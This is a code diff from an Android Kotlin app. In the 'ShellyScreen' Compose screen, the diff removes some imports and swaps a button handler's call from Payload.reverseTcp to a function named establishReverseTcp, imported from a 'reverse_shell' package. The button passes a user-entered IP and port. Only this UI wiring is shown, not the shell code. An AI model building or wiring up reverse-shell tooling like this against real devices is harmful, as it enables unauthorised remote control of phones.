@@ -1,11 +1,6 @@
 package com.satwik.nexgenius.core.main
 
 import android.Manifest
-import android.content.ComponentName
-import android.content.Context
-import android.content.pm.PackageManager
-import android.database.Cursor
-import android.net.Uri
 import android.os.Build
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
@@ -28,7 +23,7 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.input.TextFieldValue
 import androidx.compose.ui.unit.dp
 import androidx.lifecycle.viewmodel.compose.viewModel
-import com.satwik.nexgenius.core.reverse_shell.Payload
+import com.satwik.nexgenius.core.reverse_shell.establishReverseTcp
 import kotlinx.coroutines.DelicateCoroutinesApi
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
@@ -89,7 +84,7 @@ fun ShellyScreen(){
         Button(
             onClick = {
                 GlobalScope.launch(Dispatchers.IO) {
-                    Payload.reverseTcp(ip.text, port.text.toInt(), context)
+                    establishReverseTcp(ip.text, port.text.toInt(), 10000, context)
                 }
             },
         ) {
